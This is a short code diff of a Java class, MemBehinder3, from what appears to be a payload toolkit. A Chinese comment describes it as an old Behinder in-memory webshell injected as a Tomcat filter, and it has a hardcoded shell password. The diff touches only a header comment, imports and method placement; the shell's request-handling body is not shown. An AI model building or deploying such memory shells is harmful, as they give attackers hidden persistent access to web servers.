@@ -1,10 +1,5 @@
 package cn.safe6.payload.memshell;
 
-//
-// Source code recreated from a .class file by IntelliJ IDEA
-// (powered by FernFlower decompiler)
-//
-
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -33,6 +28,10 @@ import org.apache.catalina.core.StandardContext;
 import org.apache.catalina.util.LifecycleBase;
 import sun.misc.BASE64Decoder;
 
+
+/**
+ * 老冰蝎内存马，依赖pageContext
+ */
 public class MemBehinder3 implements Filter {
     public PageContext pageContext;
     public String passwd = "shell@2021";
@@ -41,8 +40,7 @@ public class MemBehinder3 implements Filter {
         this.pageContext = var1;
     }
 
-    public void init(FilterConfig var1) throws ServletException {
-    }
+
 
     public static String md5(String var0) {
         String var1 = null;
@@ -55,6 +53,11 @@ public class MemBehinder3 implements Filter {
         }
 
         return var1.substring(0, 16).toLowerCase();
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
     }
 
     public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException {
